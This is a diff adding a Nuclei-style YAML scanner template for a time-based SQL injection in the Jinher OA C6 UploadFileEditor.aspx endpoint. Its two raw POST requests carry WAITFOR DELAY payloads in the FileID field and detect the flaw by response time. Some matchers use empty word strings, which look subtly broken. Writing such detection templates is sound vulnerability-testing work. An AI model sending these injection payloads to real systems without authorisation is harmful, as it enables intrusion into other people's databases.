@@ -1,0 +1,58 @@
+id: poc-yaml-jinher-oa-uploadfileeditor-sqli
+
+info:
+  name: 金和OA C6 UploadFileEditor SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1, 4)}}'
+  t4: '{{to_number(t3) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        FileID=1';WAITFOR+DELAY'0:0:{{t1}}'--+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= t1 && duration <= t2
+      - type: word
+        words:
+          - "jhsoft.web.customquery"
+        condition: or
+      - type: word
+        words:
+          - ""
+        condition: or
+
+  - raw:
+      - |
+        POST /C6/Control/UploadFileEditor.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        FileID=1';WAITFOR+DELAY'0:0:{{t3}}'--+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= t3 && duration <= t4
+      - type: word
+        words:
+          - "jhsoft.web.customquery"
+        condition: or
+      - type: word
+        words:
+          - ""
+        condition: or
